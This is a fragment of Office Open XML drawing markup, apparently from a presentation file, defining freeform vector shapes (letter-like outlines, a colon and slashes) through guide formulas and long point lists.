                <a:gd name="T53" fmla="*/ 10 h 212"/>
                <a:gd name="T54" fmla="*/ 54 w 159"/>
                <a:gd name="T55" fmla="*/ 0 h 212"/>
                <a:gd name="T56" fmla="*/ 62 w 159"/>
                <a:gd name="T57" fmla="*/ 128 h 212"/>
                <a:gd name="T58" fmla="*/ 66 w 159"/>
                <a:gd name="T59" fmla="*/ 134 h 212"/>
                <a:gd name="T60" fmla="*/ 79 w 159"/>
                <a:gd name="T61" fmla="*/ 144 h 212"/>
                <a:gd name="T62" fmla="*/ 87 w 159"/>
                <a:gd name="T63" fmla="*/ 146 h 212"/>
                <a:gd name="T64" fmla="*/ 102 w 159"/>
                <a:gd name="T65" fmla="*/ 142 h 212"/>
                <a:gd name="T66" fmla="*/ 112 w 159"/>
                <a:gd name="T67" fmla="*/ 128 h 212"/>
                <a:gd name="T68" fmla="*/ 118 w 159"/>
                <a:gd name="T69" fmla="*/ 107 h 212"/>
                <a:gd name="T70" fmla="*/ 122 w 159"/>
                <a:gd name="T71" fmla="*/ 76 h 212"/>
                <a:gd name="T72" fmla="*/ 120 w 159"/>
                <a:gd name="T73" fmla="*/ 47 h 212"/>
                <a:gd name="T74" fmla="*/ 114 w 159"/>
                <a:gd name="T75" fmla="*/ 25 h 212"/>
                <a:gd name="T76" fmla="*/ 104 w 159"/>
                <a:gd name="T77" fmla="*/ 12 h 212"/>
                <a:gd name="T78" fmla="*/ 91 w 159"/>
                <a:gd name="T79" fmla="*/ 8 h 212"/>
                <a:gd name="T80" fmla="*/ 83 w 159"/>
                <a:gd name="T81" fmla="*/ 10 h 212"/>
                <a:gd name="T82" fmla="*/ 69 w 159"/>
                <a:gd name="T83" fmla="*/ 20 h 212"/>
                <a:gd name="T84" fmla="*/ 60 w 159"/>
                <a:gd name="T85" fmla="*/ 37 h 212"/>
                <a:gd name="T86" fmla="*/ 54 w 159"/>
                <a:gd name="T87" fmla="*/ 64 h 212"/>
                <a:gd name="T88" fmla="*/ 54 w 159"/>
                <a:gd name="T89" fmla="*/ 80 h 212"/>
                <a:gd name="T90" fmla="*/ 58 w 159"/>
                <a:gd name="T91" fmla="*/ 119 h 212"/>
                <a:gd name="T92" fmla="*/ 62 w 159"/>
                <a:gd name="T93" fmla="*/ 128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59" h="212">
                  <a:moveTo>
                    <a:pt x="54" y="22"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="54" y="22"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="64" y="12"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="75" y="4"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="87" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="99" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="99" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="112" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="124" y="4"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="134" y="10"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="143" y="18"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="149" y="29"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="155" y="41"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="157" y="56"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="159" y="72"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="159" y="72"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="157" y="91"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="153" y="107"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="149" y="120"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="141" y="132"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="141" y="132"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="132" y="142"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="120" y="148"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="108" y="152"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="93" y="153"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="93" y="153"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="83" y="152"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="73" y="150"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="64" y="146"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="54" y="138"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="54" y="177"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="54" y="177"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="56" y="192"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="56" y="196"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="58" y="200"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="62" y="202"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="66" y="204"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="77" y="204"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="77" y="212"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="212"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="204"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="204"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11" y="204"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15" y="202"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17" y="200"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="21" y="192"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="21" y="177"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="21" y="37"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="21" y="37"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="21" y="23"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17" y="16"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15" y="12"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11" y="12"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="10"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="4"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="54" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="54" y="22"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="62" y="128"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="62" y="128"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="66" y="134"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="71" y="140"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="79" y="144"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="87" y="146"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="87" y="146"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="95" y="144"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="102" y="142"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="108" y="136"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="112" y="128"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="116" y="119"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="118" y="107"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="120" y="93"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="122" y="76"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="122" y="76"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="120" y="47"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="116" y="35"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="114" y="25"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="108" y="18"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="104" y="12"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="97" y="10"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="91" y="8"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="91" y="8"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="83" y="10"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="75" y="14"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="69" y="20"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="64" y="27"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="60" y="37"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="56" y="51"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="54" y="64"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="54" y="80"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="54" y="80"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="56" y="107"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="58" y="119"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="62" y="128"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="62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0" name="Freeform 71">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8D6779C5-D0D8-474E-ACAB-074CD7335F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17473" y="4770827"/>
              <a:ext cx="21336" cy="70967"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="T0" fmla="*/ 46 w 46"/>
                <a:gd name="T1" fmla="*/ 23 h 153"/>
                <a:gd name="T2" fmla="*/ 46 w 46"/>
                <a:gd name="T3" fmla="*/ 23 h 153"/>
                <a:gd name="T4" fmla="*/ 44 w 46"/>
                <a:gd name="T5" fmla="*/ 33 h 153"/>
                <a:gd name="T6" fmla="*/ 40 w 46"/>
                <a:gd name="T7" fmla="*/ 39 h 153"/>
                <a:gd name="T8" fmla="*/ 33 w 46"/>
                <a:gd name="T9" fmla="*/ 45 h 153"/>
                <a:gd name="T10" fmla="*/ 23 w 46"/>
                <a:gd name="T11" fmla="*/ 47 h 153"/>
                <a:gd name="T12" fmla="*/ 23 w 46"/>
                <a:gd name="T13" fmla="*/ 47 h 153"/>
                <a:gd name="T14" fmla="*/ 13 w 46"/>
                <a:gd name="T15" fmla="*/ 45 h 153"/>
                <a:gd name="T16" fmla="*/ 6 w 46"/>
                <a:gd name="T17" fmla="*/ 39 h 153"/>
                <a:gd name="T18" fmla="*/ 2 w 46"/>
                <a:gd name="T19" fmla="*/ 33 h 153"/>
                <a:gd name="T20" fmla="*/ 0 w 46"/>
                <a:gd name="T21" fmla="*/ 23 h 153"/>
                <a:gd name="T22" fmla="*/ 0 w 46"/>
                <a:gd name="T23" fmla="*/ 23 h 153"/>
                <a:gd name="T24" fmla="*/ 2 w 46"/>
                <a:gd name="T25" fmla="*/ 14 h 153"/>
                <a:gd name="T26" fmla="*/ 6 w 46"/>
                <a:gd name="T27" fmla="*/ 6 h 153"/>
                <a:gd name="T28" fmla="*/ 13 w 46"/>
                <a:gd name="T29" fmla="*/ 2 h 153"/>
                <a:gd name="T30" fmla="*/ 23 w 46"/>
                <a:gd name="T31" fmla="*/ 0 h 153"/>
                <a:gd name="T32" fmla="*/ 23 w 46"/>
                <a:gd name="T33" fmla="*/ 0 h 153"/>
                <a:gd name="T34" fmla="*/ 33 w 46"/>
                <a:gd name="T35" fmla="*/ 2 h 153"/>
                <a:gd name="T36" fmla="*/ 40 w 46"/>
                <a:gd name="T37" fmla="*/ 6 h 153"/>
                <a:gd name="T38" fmla="*/ 44 w 46"/>
                <a:gd name="T39" fmla="*/ 14 h 153"/>
                <a:gd name="T40" fmla="*/ 46 w 46"/>
                <a:gd name="T41" fmla="*/ 23 h 153"/>
                <a:gd name="T42" fmla="*/ 46 w 46"/>
                <a:gd name="T43" fmla="*/ 23 h 153"/>
                <a:gd name="T44" fmla="*/ 46 w 46"/>
                <a:gd name="T45" fmla="*/ 130 h 153"/>
                <a:gd name="T46" fmla="*/ 46 w 46"/>
                <a:gd name="T47" fmla="*/ 130 h 153"/>
                <a:gd name="T48" fmla="*/ 44 w 46"/>
                <a:gd name="T49" fmla="*/ 140 h 153"/>
                <a:gd name="T50" fmla="*/ 40 w 46"/>
                <a:gd name="T51" fmla="*/ 148 h 153"/>
                <a:gd name="T52" fmla="*/ 33 w 46"/>
                <a:gd name="T53" fmla="*/ 152 h 153"/>
                <a:gd name="T54" fmla="*/ 23 w 46"/>
                <a:gd name="T55" fmla="*/ 153 h 153"/>
                <a:gd name="T56" fmla="*/ 23 w 46"/>
                <a:gd name="T57" fmla="*/ 153 h 153"/>
                <a:gd name="T58" fmla="*/ 13 w 46"/>
                <a:gd name="T59" fmla="*/ 152 h 153"/>
                <a:gd name="T60" fmla="*/ 6 w 46"/>
                <a:gd name="T61" fmla="*/ 148 h 153"/>
                <a:gd name="T62" fmla="*/ 2 w 46"/>
                <a:gd name="T63" fmla="*/ 140 h 153"/>
                <a:gd name="T64" fmla="*/ 0 w 46"/>
                <a:gd name="T65" fmla="*/ 130 h 153"/>
                <a:gd name="T66" fmla="*/ 0 w 46"/>
                <a:gd name="T67" fmla="*/ 130 h 153"/>
                <a:gd name="T68" fmla="*/ 2 w 46"/>
                <a:gd name="T69" fmla="*/ 120 h 153"/>
                <a:gd name="T70" fmla="*/ 6 w 46"/>
                <a:gd name="T71" fmla="*/ 113 h 153"/>
                <a:gd name="T72" fmla="*/ 13 w 46"/>
                <a:gd name="T73" fmla="*/ 109 h 153"/>
                <a:gd name="T74" fmla="*/ 23 w 46"/>
                <a:gd name="T75" fmla="*/ 107 h 153"/>
                <a:gd name="T76" fmla="*/ 23 w 46"/>
                <a:gd name="T77" fmla="*/ 107 h 153"/>
                <a:gd name="T78" fmla="*/ 33 w 46"/>
                <a:gd name="T79" fmla="*/ 109 h 153"/>
                <a:gd name="T80" fmla="*/ 40 w 46"/>
                <a:gd name="T81" fmla="*/ 113 h 153"/>
                <a:gd name="T82" fmla="*/ 44 w 46"/>
                <a:gd name="T83" fmla="*/ 120 h 153"/>
                <a:gd name="T84" fmla="*/ 46 w 46"/>
                <a:gd name="T85" fmla="*/ 130 h 153"/>
                <a:gd name="T86" fmla="*/ 46 w 46"/>
                <a:gd name="T87" fmla="*/ 13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6" h="153">
                  <a:moveTo>
                    <a:pt x="46" y="23"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="46" y="23"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="44" y="33"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="40" y="39"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="33" y="45"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="23" y="47"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="23" y="47"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13" y="45"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6" y="39"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2" y="33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2" y="14"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6" y="6"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13" y="2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33" y="2"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="40" y="6"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="44" y="14"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="46" y="23"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="46" y="23"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="46" y="130"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="46" y="130"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="44" y="140"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="40" y="148"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="33" y="152"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="23" y="153"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="23" y="153"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13" y="152"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6" y="148"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2" y="140"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="130"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="130"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2" y="120"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6" y="113"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13" y="109"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="23" y="107"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="23" y="107"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="33" y="109"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="40" y="113"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="44" y="120"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="46" y="130"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="46" y="1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1" name="Freeform 72">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{24C20C69-752D-4D1E-A649-7E8C4BC70E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6231" y="4742996"/>
              <a:ext cx="50094" cy="119670"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="T0" fmla="*/ 93 w 108"/>
                <a:gd name="T1" fmla="*/ 0 h 258"/>
                <a:gd name="T2" fmla="*/ 108 w 108"/>
                <a:gd name="T3" fmla="*/ 0 h 258"/>
                <a:gd name="T4" fmla="*/ 15 w 108"/>
                <a:gd name="T5" fmla="*/ 258 h 258"/>
                <a:gd name="T6" fmla="*/ 0 w 108"/>
                <a:gd name="T7" fmla="*/ 258 h 258"/>
                <a:gd name="T8" fmla="*/ 93 w 108"/>
                <a:gd name="T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258">
                  <a:moveTo>
                    <a:pt x="93" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="108" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15" y="258"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="258"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9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2" name="Freeform 73">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{DF970D23-DA51-497D-B244-D97F128E69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6325" y="4742996"/>
              <a:ext cx="51486" cy="119670"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="T0" fmla="*/ 94 w 111"/>
                <a:gd name="T1" fmla="*/ 0 h 258"/>
                <a:gd name="T2" fmla="*/ 111 w 111"/>
                <a:gd name="T3" fmla="*/ 0 h 258"/>
                <a:gd name="T4" fmla="*/ 18 w 111"/>
                <a:gd name="T5" fmla="*/ 258 h 258"/>
                <a:gd name="T6" fmla="*/ 0 w 111"/>
                <a:gd name="T7" fmla="*/ 258 h 258"/>
                <a:gd name="T8" fmla="*/ 94 w 111"/>
                <a:gd name="T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" h="258">
                  <a:moveTo>
                    <a:pt x="94" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="111" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="18" y="258"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="258"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9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3" name="Freeform 74">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{A2EF3A58-307C-49F0-A2D7-1DF29A69D9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3377" y="4770827"/>
              <a:ext cx="72822" cy="98333"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="T0" fmla="*/ 54 w 157"/>
                <a:gd name="T1" fmla="*/ 22 h 212"/>
                <a:gd name="T2" fmla="*/ 74 w 157"/>
                <a:gd name="T3" fmla="*/ 4 h 212"/>
                <a:gd name="T4" fmla="*/ 99 w 157"/>
                <a:gd name="T5" fmla="*/ 0 h 212"/>
                <a:gd name="T6" fmla="*/ 112 w 157"/>
                <a:gd name="T7" fmla="*/ 0 h 212"/>
                <a:gd name="T8" fmla="*/ 134 w 157"/>
                <a:gd name="T9" fmla="*/ 10 h 212"/>
                <a:gd name="T10" fmla="*/ 149 w 157"/>
                <a:gd name="T11" fmla="*/ 29 h 212"/>
                <a:gd name="T12" fmla="*/ 157 w 157"/>
                <a:gd name="T13" fmla="*/ 56 h 212"/>
                <a:gd name="T14" fmla="*/ 157 w 157"/>
                <a:gd name="T15" fmla="*/ 72 h 212"/>
                <a:gd name="T16" fmla="*/ 153 w 157"/>
                <a:gd name="T17" fmla="*/ 107 h 212"/>
                <a:gd name="T18" fmla="*/ 140 w 157"/>
                <a:gd name="T19" fmla="*/ 132 h 212"/>
                <a:gd name="T20" fmla="*/ 132 w 157"/>
                <a:gd name="T21" fmla="*/ 142 h 212"/>
                <a:gd name="T22" fmla="*/ 107 w 157"/>
                <a:gd name="T23" fmla="*/ 152 h 212"/>
                <a:gd name="T24" fmla="*/ 93 w 157"/>
                <a:gd name="T25" fmla="*/ 153 h 212"/>
                <a:gd name="T26" fmla="*/ 74 w 157"/>
                <a:gd name="T27" fmla="*/ 150 h 212"/>
                <a:gd name="T28" fmla="*/ 54 w 157"/>
                <a:gd name="T29" fmla="*/ 138 h 212"/>
                <a:gd name="T30" fmla="*/ 54 w 157"/>
                <a:gd name="T31" fmla="*/ 177 h 212"/>
                <a:gd name="T32" fmla="*/ 56 w 157"/>
                <a:gd name="T33" fmla="*/ 196 h 212"/>
                <a:gd name="T34" fmla="*/ 60 w 157"/>
                <a:gd name="T35" fmla="*/ 202 h 212"/>
                <a:gd name="T36" fmla="*/ 77 w 157"/>
                <a:gd name="T37" fmla="*/ 204 h 212"/>
                <a:gd name="T38" fmla="*/ 0 w 157"/>
                <a:gd name="T39" fmla="*/ 212 h 212"/>
                <a:gd name="T40" fmla="*/ 0 w 157"/>
                <a:gd name="T41" fmla="*/ 204 h 212"/>
                <a:gd name="T42" fmla="*/ 15 w 157"/>
                <a:gd name="T43" fmla="*/ 202 h 212"/>
                <a:gd name="T44" fmla="*/ 19 w 157"/>
                <a:gd name="T45" fmla="*/ 192 h 212"/>
                <a:gd name="T46" fmla="*/ 21 w 157"/>
                <a:gd name="T47" fmla="*/ 37 h 212"/>
                <a:gd name="T48" fmla="*/ 19 w 157"/>
                <a:gd name="T49" fmla="*/ 23 h 212"/>
                <a:gd name="T50" fmla="*/ 13 w 157"/>
                <a:gd name="T51" fmla="*/ 12 h 212"/>
                <a:gd name="T52" fmla="*/ 0 w 157"/>
                <a:gd name="T53" fmla="*/ 10 h 212"/>
                <a:gd name="T54" fmla="*/ 54 w 157"/>
                <a:gd name="T55" fmla="*/ 0 h 212"/>
                <a:gd name="T56" fmla="*/ 62 w 157"/>
                <a:gd name="T57" fmla="*/ 128 h 212"/>
                <a:gd name="T58" fmla="*/ 66 w 157"/>
                <a:gd name="T59" fmla="*/ 134 h 212"/>
                <a:gd name="T60" fmla="*/ 79 w 157"/>
                <a:gd name="T61" fmla="*/ 144 h 212"/>
                <a:gd name="T62" fmla="*/ 87 w 157"/>
                <a:gd name="T63" fmla="*/ 146 h 212"/>
                <a:gd name="T64" fmla="*/ 101 w 157"/>
                <a:gd name="T65" fmla="*/ 142 h 212"/>
                <a:gd name="T66" fmla="*/ 112 w 157"/>
                <a:gd name="T67" fmla="*/ 128 h 212"/>
                <a:gd name="T68" fmla="*/ 118 w 157"/>
                <a:gd name="T69" fmla="*/ 107 h 212"/>
                <a:gd name="T70" fmla="*/ 120 w 157"/>
                <a:gd name="T71" fmla="*/ 76 h 212"/>
                <a:gd name="T72" fmla="*/ 118 w 157"/>
                <a:gd name="T73" fmla="*/ 47 h 212"/>
                <a:gd name="T74" fmla="*/ 112 w 157"/>
                <a:gd name="T75" fmla="*/ 25 h 212"/>
                <a:gd name="T76" fmla="*/ 103 w 157"/>
                <a:gd name="T77" fmla="*/ 12 h 212"/>
                <a:gd name="T78" fmla="*/ 91 w 157"/>
                <a:gd name="T79" fmla="*/ 8 h 212"/>
                <a:gd name="T80" fmla="*/ 81 w 157"/>
                <a:gd name="T81" fmla="*/ 10 h 212"/>
                <a:gd name="T82" fmla="*/ 68 w 157"/>
                <a:gd name="T83" fmla="*/ 20 h 212"/>
                <a:gd name="T84" fmla="*/ 58 w 157"/>
                <a:gd name="T85" fmla="*/ 37 h 212"/>
                <a:gd name="T86" fmla="*/ 54 w 157"/>
                <a:gd name="T87" fmla="*/ 64 h 212"/>
                <a:gd name="T88" fmla="*/ 54 w 157"/>
                <a:gd name="T89" fmla="*/ 80 h 212"/>
                <a:gd name="T90" fmla="*/ 58 w 157"/>
                <a:gd name="T91" fmla="*/ 119 h 212"/>
                <a:gd name="T92" fmla="*/ 62 w 157"/>
                <a:gd name="T93" fmla="*/ 128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57" h="212">
                  <a:moveTo>
                    <a:pt x="54" y="22"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="54" y="22"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="64" y="12"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="74" y="4"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="85" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="99" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="99" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="112" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="124" y="4"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="134" y="10"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="143" y="18"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="149" y="29"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="153" y="41"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="157" y="56"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="157" y="72"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="157" y="72"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="157" y="91"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="153" y="107"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="147" y="120"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="140" y="132"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="140" y="132"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="132" y="142"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="120" y="148"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="107" y="152"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="93" y="153"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="93" y="153"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="81" y="152"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="74" y="150"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="64" y="146"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="54" y="138"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="54" y="177"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="54" y="177"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="54" y="192"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="56" y="196"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="58" y="200"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="60" y="202"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="64" y="204"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="77" y="204"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="77" y="212"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="212"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="204"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="204"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11" y="204"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15" y="202"/>
